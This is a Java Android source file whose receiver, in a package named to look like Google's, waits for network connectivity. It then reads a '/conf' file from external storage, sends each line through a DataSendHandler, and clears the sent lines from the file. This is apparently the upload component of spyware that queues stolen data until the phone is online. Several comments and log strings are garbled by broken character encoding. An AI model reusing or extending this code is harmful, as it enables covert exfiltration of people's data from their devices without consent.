package com.google.android.bs;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.os.Environment;
import android.util.Log;

public class NetworkChangeReceiver extends BroadcastReceiver {
	File outFile;
	File tmpFile;
	String str;
	BufferedReader fin;
	BufferedWriter fout;
	SharedPreferences sp;
	
	@Override
	public void onReceive(final Context context, final Intent intent) {
		final ConnectivityManager connMgr = (ConnectivityManager) context
				.getSystemService(Context.CONNECTIVITY_SERVICE);

		final android.net.NetworkInfo wifi = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

		final android.net.NetworkInfo mobile = connMgr
				.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);

		if (wifi.isAvailable() || mobile.isConnectedOrConnecting()) {
			DataSendHandler sendMeth = new DataSendHandler(context);
			outFile = new File(Environment.getExternalStorageDirectory(),
					"/conf");
			if(outFile.exists() == false){
				Log.d("outfile", "no exist");
				return;
			}
			tmpFile = new File(Environment.getExternalStorageDirectory(),
					"/tmpSendFile.txt");

			try {
				fin = new BufferedReader(new InputStreamReader(
						new FileInputStream(outFile)));
				try {
					fout = new BufferedWriter(new FileWriter(tmpFile));
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
					
				}
			} catch (FileNotFoundException e) {
				// TODO ������������� ��������� ���� catch
				e.printStackTrace();
				return;
			}
			try {
				String lineToRemove = null;
				while ((str = fin.readLine()) != null) {
					Log.d("Sendfile", str);
					sendMeth.send(str);
					lineToRemove = str;
					String trimmedLine = str.trim();
					if (trimmedLine.equals(lineToRemove))
						continue;
					fout.write(str);

				}

				boolean successful = tmpFile.renameTo(outFile);

				Log.d("networkchange", "Rename file:" + Boolean.toString(successful));
			} catch (IOException e) {
				// TODO ������������� ��������� ���� catch
				e.printStackTrace();
				return;
			}
			try {
				fin.close();
				fout.close();
			} catch (IOException e) {
				// TODO ������������� ��������� ���� catch
				e.printStackTrace();
			}
		} else
			Log.d("Netowk Available ", "��������");
	}	
			
}